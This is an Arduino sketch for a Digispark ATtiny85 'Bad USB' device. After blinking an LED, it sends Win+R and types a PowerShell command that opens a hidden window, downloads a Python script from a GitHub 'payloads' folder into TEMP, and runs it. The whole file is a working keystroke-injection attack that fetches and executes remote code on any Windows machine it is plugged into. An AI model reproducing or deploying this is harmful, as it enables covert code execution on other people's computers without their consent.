#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  // Blink LED 3 times as warning
  for (int i = 0; i < 3; i++) {
    DigiKeyboard.delay(500);
    digitalWrite(1, HIGH);
    DigiKeyboard.delay(500);
    digitalWrite(1, LOW);
  }

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("powershell -c \"Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command \"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Jaepe/ATtiny85-Bad-USB/refs/heads/main/payloads/screenshot_wallpaper.py', $env:TEMP + '\\a.py'); python $env:TEMP\\a.py'\"\"");
  DigiKeyboard.delay(500);

  digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
  while(1);
}
